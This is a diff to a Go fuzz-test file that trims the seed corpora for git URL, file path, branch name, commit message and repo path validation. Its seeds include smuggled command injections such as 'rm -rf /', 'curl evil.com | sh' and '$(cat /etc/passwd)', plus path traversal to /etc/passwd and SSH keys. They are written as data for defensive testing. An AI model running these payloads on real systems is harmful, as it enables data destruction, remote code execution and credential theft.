@@ -12,63 +12,32 @@ import (
 )
 
 func FuzzGitURLSafety(f *testing.F) {
-	// Add seed corpus
+	// Add seed corpus - optimized to 15 high-value security test cases
 	seeds := []string{
-		// Valid URLs
+		// Valid URLs (3)
 		"https://github.com/org/repo.git",
 		"git@github.com:org/repo.git",
-		"git://github.com/org/repo.git",
 		"ssh://git@github.com/org/repo.git",
-		"https://user:pass@github.com/org/repo.git",
-		"https://github.com/org/repo",
 
-		// Command injection attempts
+		// Command injection attempts (5)
 		"https://github.com/org/repo.git; rm -rf /",
 		"https://github.com/org/repo.git && curl evil.com | sh",
 		"https://github.com/org/repo.git`whoami`",
 		"https://github.com/org/repo.git$(cat /etc/passwd)",
-		"https://github.com/org/repo.git|tee /tmp/pwned",
-		"https://github.com/org/repo.git > /dev/null",
-		"https://github.com/org/repo.git < /etc/passwd",
 		"git@github.com:org/repo.git; echo pwned",
 
-		// Path traversal attempts
+		// Path traversal attempts (3)
 		"file:///etc/passwd",
-		"file://../../etc/passwd",
 		"../../../etc/passwd",
 		"https://github.com/../../../../etc/passwd",
-		"..\\..\\windows\\system32",
-		"~/.ssh/id_rsa",
-		"$HOME/.ssh/config",
 
-		// Special characters and encoding
-		"https://github.com/org/repo.git#$(whoami)",
-		"https://github.com/org/repo.git?cmd=exec",
+		// Special characters (2)
 		"https://github.com/org/repo\x00.git",
 		"https://github.com/org/repo\n.git",
-		"https://github.com/org/repo\r\n.git",
-		"https://github.com/org/repo with spaces.git",
-		"https://github.com/org/repo'test'.git",
-		"https://github.com/org/repo\"test\".git",
 
-		// Unicode and internationalization
-		"https://github.com/🎉/🎉.git",
-		"https://github.com/org/répo.git",
-
-		// IPv6 and special hosts
-		"git://[::1]/repo.git",
-		"git://[2001:db8::1]/repo.git",
-		"git://localhost/repo.git",
-		"git://127.0.0.1/repo.git",
-
-		// Edge cases
+		// Edge cases (2)
 		strings.Repeat("https://github.com/org/", 100) + "repo.git",
 		"",
-		" ",
-		"\t",
-		"://",
-		"git@",
-		"https://",
 	}
 
 	for _, seed := range seeds {
@@ -107,74 +76,32 @@ func FuzzGitURLSafety(f *testing.F) {
 }
 
 func FuzzGitFilePath(f *testing.F) {
-	// Add seed corpus
+	// Add seed corpus - optimized to 15 high-value security test cases
 	seeds := []string{
-		// Valid file paths
+		// Valid file paths (2)
 		"README.md",
 		"src/main.go",
-		"docs/guide.md",
-		"file.txt",
-		".",
-		"dir/",
-		"dir/subdir/file.txt",
 
-		// Path traversal attempts
+		// Path traversal attempts (4)
 		"../../../etc/passwd",
 		"..\\..\\windows\\system32\\config",
-		"../../../../etc/shadow",
-		"..",
-		"...",
-		"./../../secret",
 		"~/.ssh/id_rsa",
 		"$HOME/.bashrc",
-		"%USERPROFILE%\\secrets",
 
-		// Command injection attempts
+		// Command injection attempts (4)
 		"file;rm -rf /.txt",
 		"file && curl evil.com | sh",
 		"file`whoami`.txt",
 		"file$(cat /etc/passwd).txt",
-		"file|tee /tmp/pwned.txt",
-		"file > /dev/null",
-		"file < /etc/passwd",
 
-		// Special characters
-		"file with spaces.txt",
+		// Special characters (3)
 		"file\x00.txt",
 		"file\n.txt",
-		"file\r\n.txt",
-		"file\t.txt",
-		"file'test'.txt",
-		"file\"test\".txt",
-		"file\\test.txt",
-
-		// Git special paths
 		".git/config",
-		".git/hooks/pre-commit",
-		".gitignore",
-		".gitmodules",
 
-		// Unicode paths
-		"file🎉.txt",
-		"café.txt",
-
-		// Special file names
+		// Edge cases (2)
 		"",
-		" ",
-		"\t",
-		"-",
-		"--",
-		"-rf",
-		"*",
-		"*.txt",
-		"file|command.txt",
-		"file>.txt",
-		"file<.txt",
-		"file&.txt",
-
-		// Very long paths
 		strings.Repeat("a/", 100) + "file.txt",
-		strings.Repeat("a", 255) + ".txt",
 	}
 
 	for _, seed := range seeds {
@@ -210,86 +137,36 @@ func FuzzGitFilePath(f *testing.F) {
 }
 
 func FuzzGitBranchName(f *testing.F) {
-	// Add seed corpus
+	// Add seed corpus - optimized to 15 high-value security test cases
 	seeds := []string{
-		// Valid branch names
+		// Valid branch names (2)
 		"master",
-		"develop",
-		"feature/test",
 		"feature/test-123",
-		"release/v1.0.0",
-		"hotfix/urgent-fix",
-		"user/name/feature",
 
-		// Command injection attempts
+		// Command injection attempts (4)
 		"main; rm -rf /",
 		"feat`whoami`",
 		"feat$(cat /etc/passwd)",
 		"branch && curl evil.com | sh",
-		"branch|tee /tmp/pwn",
-		"branch > /dev/null",
-		"branch < /etc/passwd",
 
-		// Git special characters
+		// Git special characters (3)
 		"branch~1",
-		"branch^",
 		"branch:test",
 		"branch..other",
-		"branch...other",
-		"branch@{upstream}",
-		"branch@{-1}",
-		"branch.lock",
 
-		// Leading dashes (could be flags)
+		// Leading dashes - could be interpreted as flags (1)
 		"-branch",
-		"--branch",
-		"-rf",
-		"--force",
-		"--help",
-		"-",
 
-		// Path traversal in branch names
+		// Path traversal in branch names (2)
 		"../../../etc/passwd",
 		"refs/../heads/main",
-		"heads/../../config",
 
-		// Special characters and whitespace
+		// Special characters (2)
 		"",
-		" ",
-		"\t",
-		"\n",
-		"branch with spaces",
 		"branch\x00null",
-		"branch\r\n",
-		"branch'quote'",
-		"branch\"doublequote\"",
-		"branch\\backslash",
 
-		// Unicode
-		"feature/🎉",
-		"brançh", // Accented
-
-		// Git refs format
-		"refs/heads/main",
-		"refs/tags/v1.0",
-		"refs/remotes/origin/main",
-		"HEAD",
-		"@",
-
-		// Special Git names
-		"HEAD~1",
-		"ORIG_HEAD",
-		"FETCH_HEAD",
-		"MERGE_HEAD",
-
-		// Edge cases
-		strings.Repeat("a", 255),       // max branch length
-		strings.Repeat("a/", 50) + "b", // many slashes
-		".",
-		"..",
-		"*",
-		"[branch]",
-		"{branch}",
+		// Edge cases (1)
+		strings.Repeat("a", 255),
 	}
 
 	for _, seed := range seeds {
@@ -325,64 +202,29 @@ func FuzzGitBranchName(f *testing.F) {
 }
 
 func FuzzGitCommitMessage(f *testing.F) {
-	// Add seed corpus
+	// Add seed corpus - optimized to 12 high-value security test cases
 	seeds := []string{
-		// Normal commit messages
+		// Normal commit messages (2)
 		"Initial commit",
 		"Fix bug in authentication",
-		"Add new feature: user profiles",
-		"Update dependencies",
-		"Refactor database layer",
 
-		// Command injection attempts
+		// Command injection attempts (3)
 		"Fixed bug; rm -rf /",
 		"Update`whoami`",
 		"Fix $(cat /etc/passwd)",
-		"Feature && curl evil.com | sh",
-		"Bug fix | tee /tmp/pwned",
-		"Update > /dev/null",
-		"Fix < /etc/passwd",
 
-		// Multi-line messages
+		// Multi-line messages (2)
 		"First line\nSecond line",
 		"Title\n\nDetailed description",
-		"Fix: bug\r\nDetails: fixed null pointer",
 
-		// Special characters
+		// Special characters (3)
 		"Fix \"bug\" in 'code'",
-		"Update\\backslash",
 		"Feature\x00null",
-		"Bug\tfix",
-		"",
-		" ",
-		"\n",
-		"\t",
-
-		// Unicode and emoji
 		"🎉 Initial commit",
-		"Fix: résumé parsing",
-		"✨ Add sparkles",
 
-		// Very long messages
+		// Edge cases (2)
+		"",
 		strings.Repeat("a", 1000),
-		strings.Repeat("Fix bug. ", 100),
-
-		// Special Git conventions
-		"Merge branch 'feature'",
-		"Revert \"Previous commit\"",
-		"fixup! Original commit",
-		"squash! Another commit",
-
-		// Potential injection via substitution
-		"Fix $USER bug",
-		"Update ${HOME} path",
-		"Fix %PATH% issue",
-		"Update ~/ handling",
-
-		// URL-like content
-		"Visit https://evil.com/script.sh",
-		"See file:///etc/passwd",
-		"Check git://internal/repo",
 	}
 
 	for _, seed := range seeds {
@@ -418,59 +260,32 @@ func FuzzGitCommitMessage(f *testing.F) {
 }
 
 func FuzzGitRepoPath(f *testing.F) {
-	// Add seed corpus
+	// Add seed corpus - optimized to 15 high-value security test cases
 	seeds := []string{
-		// Valid paths
+		// Valid paths (3)
 		"/tmp/repo",
-		"/home/user/projects/myrepo",
 		"./repo",
-		"../repo",
 		"repo",
-		"/var/lib/repos/test",
 
-		// Path traversal attempts
+		// Path traversal attempts (4)
 		"../../../etc/passwd",
 		"/etc/passwd",
-		"../../root",
 		"/root/.ssh",
 		"~/.ssh/config",
-		"$HOME/.bashrc",
-		"%USERPROFILE%\\secrets",
 
-		// Command injection attempts
+		// Command injection attempts (3)
 		"/tmp/repo; rm -rf /",
 		"/tmp/repo && curl evil.com",
 		"/tmp/repo`whoami`",
-		"/tmp/repo$(cat /etc/passwd)",
 
-		// Paths with special characters
+		// Paths with special characters (3)
 		"/tmp/repo with spaces",
 		"/tmp/repo\x00null",
 		"/tmp/repo\n",
-		"/tmp/repo'quote'",
-		"/tmp/repo\"doublequote\"",
 
-		// Unicode paths
-		"/tmp/répo",
-
-		// Special cases
+		// Edge cases (2)
 		"",
-		" ",
-		"\t",
-		".",
-		"..",
-		"/",
-		"//",
-		"///multiple/slashes",
-
-		// Very long paths
-		"/" + strings.Repeat("a", 200) + "/repo",
-		strings.Repeat("../", 50) + "repo",
-
-		// Windows-style paths (might be used on Windows)
 		"C:\\repos\\test",
-		"\\\\server\\share\\repo",
-		"..\\..\\repo",
 	}
 
 	for _, seed := range seeds {
